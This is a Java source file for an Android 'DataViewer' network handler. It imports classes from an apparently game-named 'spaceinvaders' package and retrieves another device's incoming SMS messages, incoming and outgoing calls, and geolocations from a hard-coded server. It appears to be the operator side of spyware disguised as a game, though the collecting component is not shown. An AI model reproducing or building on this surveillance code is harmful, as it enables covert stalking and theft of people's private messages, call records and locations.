package com.cst.DataViewer;

import android.util.Log;
import com.cst.spaceinvaders.shared.data.*;
import com.cst.spaceinvaders.shared.network.connection.Connection;
import com.cst.spaceinvaders.shared.network.packets.*;

import java.io.IOException;
import java.net.Socket;

public class NetworkHandler implements Runnable
{
    private final DataViewerApp m_parent;
    private Connection m_connection;
    private boolean m_running;

    // Delay in ms since last sent packet before a heartbeat is sent.
    private static final long HEARTBEAT_DELAY = 2500;

    // How many ms should the thread sleep for between connection attempts
    // This is for power conservation.
    private static final long SLEEP_DELAY = 1000;

    public NetworkHandler(DataViewerApp parent)
    {
        m_parent = parent;
        m_running = true;
    }

    @Override
    public void run()
    {
        while (m_connection == null)
        {
            try
            {
                m_connection = new Connection(new Socket(Globals.SERVER_IP, Globals.SERVER_PORT));
                m_connection.write(new RequestDataPacket(null));
            }
            catch (IOException ignored)
            {
                // Connection attempt failed. Sleep for a bit.
                try
                {
                    Thread.sleep(SLEEP_DELAY);
                }
                catch (InterruptedException ignored2)
                {
                }
            }
        }

        while (true)
        {
            while (m_connection.readable())
            {
                Packet received = m_connection.read();
                handlePacket(received);
            }

            try
            {
                Thread.sleep(250);
            }
            catch (Exception ignored)
            {
            }
        }
    }

    private void handlePacket(Packet packet)
    {
        byte networkCode = packet.networkCode();

        if (networkCode == NetworkCodes.SEND_INCOMING_SMS)
        {
            m_parent.incomingSmses().add(((SendIncomingSMSPacket)packet).incomingSms());
        }
        else if (networkCode == NetworkCodes.SEND_INCOMING_CALL)
        {
            m_parent.incomingCalls().add(((SendIncomingCallPacket)packet).incomingCall());
        }
        else if (networkCode == NetworkCodes.SEND_OUTGOING_CALL)
        {
            m_parent.outgoingCalls().add(((SendOutgoingCallPacket)packet).outgoingCall());
        }
        else if (networkCode == NetworkCodes.SEND_GEOLOCATION)
        {
            m_parent.geolocations().add(((SendGeolocationPacket)packet).geplocation());
        }
    }
}
